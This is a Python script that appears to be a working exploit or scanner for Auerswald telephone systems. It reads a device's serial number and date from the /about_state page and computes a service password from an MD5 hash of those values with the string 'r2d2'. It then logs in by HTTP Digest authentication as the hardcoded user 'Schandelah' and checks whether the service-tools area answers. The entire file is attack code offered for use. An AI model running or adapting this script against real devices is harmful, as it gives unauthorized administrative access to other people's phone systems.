import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def substr(strs,s,lens):
	result=strs[s:s+lens]
	return result
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
dcnonce=randomLowercase(8)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"about_state"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search(r'serial.*?\d+.,',response.text) and re.search(r'date.+?20[0-9][0-9].,',response.text):
		r1=True
		try:
			serial=re.findall("serial\":\"(.+?)\",\"date",response.text)[0]
			date=re.findall("date\":\"(.+?)\",\"macaddr",response.text)[0]
			HA=serial + "r2d2" + date
			password=substr(md5(str(HA).encode()).hexdigest(),0,7)
		except:
			password=''
	else:
		r1=False
		password=''
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"tree"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 401:
		try:
			r2=True
			nonce=re.findall("nonce=\"(.*)\", opaque",response.headers["WWW-Authenticate"])[0]
			opaque=re.findall("opaque=\"(.*)\",algorithm",response.headers["WWW-Authenticate"])[0]
			cnonce=substr(md5(str(dcnonce).encode()).hexdigest(),0,16)
			username='Schandelah'
			OHA1=username + ":Auerswald:" + password
			HA1=md5(str(OHA1).encode()).hexdigest()
			resp=HA1 + ":" + nonce + ":" + "00000001" + ":" + cnonce + ":auth:a94ba59ccc1aaf76cedba69ce4d102d2"
			respmd5=md5(str(resp).encode()).hexdigest()
		except:
			nonce=''
			opaque=''
			cnonce=''
			respmd5=''
	else:
		r2=False
		nonce=''
		opaque=''
		cnonce=''
		respmd5=''
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"tree"
	headers={'Authorization': f'Digest username="Schandelah", realm="Auerswald", nonce="{nonce}", uri="/tree", algorithm=MD5, response="{respmd5}", opaque="{opaque}", algorithm="MD5", qop=auth, nc=00000001, cnonce="{cnonce}"'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "Servicetools" in response.text:
		r3=True
	else:
		r3=False
	if r1 and r2 and r3:
		return True
	else:
		return False
